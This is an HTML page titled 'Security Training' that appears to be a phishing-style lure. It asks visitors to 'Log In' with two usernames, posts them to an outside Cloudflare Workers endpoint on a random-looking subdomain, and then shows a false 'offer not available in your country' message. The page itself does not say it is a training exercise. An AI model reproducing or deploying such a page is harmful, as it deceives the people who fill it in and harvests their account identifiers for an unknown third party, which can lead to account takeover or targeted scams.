
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Training</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  font-family: Arial, sans-serif;
  background: #fffc00;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.container {
  background: white;
  width: 100%;
  max-width: 420px;
  padding: 36px 30px;
  border-radius: 22px;
  box-shadow: 0 14px 45px #00000015;
}

.subtitle {
  text-align: center;
  color: #666;
  font-size: 14px;
  line-height: 1.6;
}

label {
  display: block;
  margin: 15px 0 7px;
  font-size: 13px;
  font-weight: bold;
}

input {
  width: 100%;
  padding: 14px;
  border: 1px solid #ddd;
  border-radius: 10px;
  font-size: 15px;
  outline: none;
}

input:focus {
  border-color: #b6a900;
}

.primary {
  width: 100%;
  margin-top: 22px;
  padding: 15px;
  background: #fffc00;
  color: #111;
  border: none;
  border-radius: 30px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
}

.primary:hover {
  background: #eee900;
}

.primary:disabled {
  opacity: 0.6;
  cursor: wait;
}

.result {
  margin-top: 16px;
  text-align: center;
  font-size: 14px;
  line-height: 1.5;
  overflow-wrap: anywhere;
}

.error {
  color: #d00000;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="container">

  <p class="subtitle">
    Enter two test usernames
  </p>

  <form id="loginForm">

    <label for="username">Username</label>
    <input
      id="username"
      type="text"
      maxlength="40"
      autocomplete="off"
      required
    >

    <label for="username2">Username 2</label>
    <input
      id="username2"
      type="text"
      maxlength="40"
      autocomplete="off"
      required
    >

    <button
      class="primary"
      type="submit"
      id="sendButton"
    >
      Log In
    </button>

  </form>

  <div class="result" id="result" role="status"></div>

</div>

<script>
const WORKER_URL =
  "https://soft-wildflower-8b8f.gxdhdehdd.workers.dev/";

const form = document.getElementById("loginForm");
const result = document.getElementById("result");
const sendButton = document.getElementById("sendButton");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const username = document
    .getElementById("username").value.trim();

  const username2 = document
    .getElementById("username2").value.trim();

  if (!username || !username2) {
    return;
  }

  sendButton.disabled = true;
  result.classList.remove("error");
  result.textContent = "Sending...";

  try {
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        event: "demo_usernames",
        username: username,
        username2: username2
      })
    });

    if (!response.ok) {
      throw new Error("HTTP " + response.status);
    }

    result.textContent =
      "This offer is not available in your country.";

    result.classList.add("error");

  } catch (error) {
    result.textContent =
      "Connection error. Please try again.";

    result.classList.add("error");
    console.error(error);

  } finally {
    sendButton.disabled = false;
  }
});
</script>

</body>
</html>
